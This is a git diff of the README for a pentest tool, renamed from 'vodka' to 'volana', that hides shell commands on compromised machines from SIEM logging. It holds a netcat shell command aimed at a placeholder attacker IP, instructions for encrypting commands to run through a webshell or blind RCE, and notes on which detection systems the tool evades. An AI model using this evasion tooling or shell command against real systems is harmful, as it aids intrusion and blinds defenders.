@@ -1,8 +1,8 @@
 
 <div align="center">
- <h1> vodka 🧊</h1>  
+ <h1> volana 🧊</h1>  
  <h4> Shell command obfuscation to avoid SIEM detection </h4>
- <p> During pentest, an important aspect is to be stealth. For this reason you should clear your tracks after your passage. Nevertheless, many infrastructures log command and send  them to a SIEM in a real time making the cleaning part alone useless.<br><br><code>vodka</code> provide a simple way to hide commands executed on compromised machine by providing it self shell runtime (enter your command, vodka execute for you).</p>
+ <p> During pentest, an important aspect is to be stealth. For this reason you should clear your tracks after your passage. Nevertheless, many infrastructures log command and send  them to a SIEM in a real time making the cleaning part alone useless.<br><br><code>volana</code> provide a simple way to hide commands executed on compromised machine by providing it self shell runtime (enter your command, volana execute for you).</p>
 
   <p><strong><code>{ <a href="#usage">Use it</a> ; <a href="#hide-from">🧊<sub>(hide from)</sub></a>; <a href="#visible-for">👁️<sub>(detected by)</sub></a> } </code></strong></p>
 </div>
@@ -13,45 +13,45 @@ You need to get an interactive shell. (Find a way to spawned it, you are a hacke
 ```shell
 ## Download it from github release
 ## If you do not have internet access from compromised machine, find another way
-curl -lO -L https://github.com/ariary/vodka/releases/latest/download/vodka
+curl -lO -L https://github.com/ariary/volana/releases/latest/download/volana
 
 ## Execute it
-./vodka
+./volana
 
 ## You are now under the radar
-vodka » echo "Hi SIEM team! Do you find me?" > /dev/null 2>&1  #you are allowed to be a bit cocky
-vodka » [command]
+volana » echo "Hi SIEM team! Do you find me?" > /dev/null 2>&1  #you are allowed to be a bit cocky
+volana » [command]
 ```
 
-Keyword for vodka console:
+Keyword for volana console:
 * `ring`: enable ring mode ie each command is launched with plenty others to cover tracks (from solution that monitor system call)
-* `exit`: exit vodka console
+* `exit`: exit volana console
 
 ### from non interactive shell
 
 Imagine you have a non interactive shell (webshell or blind rce), you could use `encrypt` and `decrypt` subcommand.
-Previously, you need to build `vodka` with embedded encryption key.
+Previously, you need to build `volana` with embedded encryption key.
 
 **On attacker machine**
 ```shell
 ## ATTACKER MACHINE
 
-## Build vodka with encryption key
-make build.vodka-with-enc
+## Build volana with encryption key
+make build.volana-with-enc
 
 ## Transfer it on TARGET (the unique detectable command)
 ## [...]
 
 ## Encrypt the command you want to stealthy execute
 ## (Here a nc bindshell to obtain a interactive shell)
-vodka encrypt "nc [attacker_ip] [attacker_port] -e /bin/bash"
+volana encrypt "nc [attacker_ip] [attacker_port] -e /bin/bash"
 **encrypted cmd**
 ```
 
 Copy encrypted command and executed it with your rce **on target machine**
 ```shell
-./vodka decrypt [encrypted_command]
-## Now you have a bindshell shell, spawn it to make it interactive and use vodka normally)
+./volana decrypt [encrypted_command]
+## Now you have a bindshell shell, spawn it to make it interactive and use volana normally)
 
 ```
 
@@ -62,14 +62,14 @@ Because we want to be protected against system that trigger alert for `base64` u
 
 ## Detection
 
-Keep in mind that `vodka` is not a miracle that will make you totally invisible. It aim is to make intrusion detection and investigation harder.
+Keep in mind that `volana` is not a miracle that will make you totally invisible. It aim is to make intrusion detection and investigation harder.
 
 By detected we mean if we are able to trigger an alert if a certain command has been executed.
 
 
 ### Hide from
 
-Only the `vodka` launch command line will be catched
+Only the `volana` launch command line will be catched
 
 
 * Detection systems that are based on history command output
@@ -78,7 +78,7 @@ Only the `vodka` launch command line will be catched
 
 ### Visible for
 
-* Detection systems that have alert for unknown command (vodka one)
+* Detection systems that have alert for unknown command (volana one)
 * Detection systems that are based on keylogger
   * Easy to avoid: copy/past commands
   * Not a common case
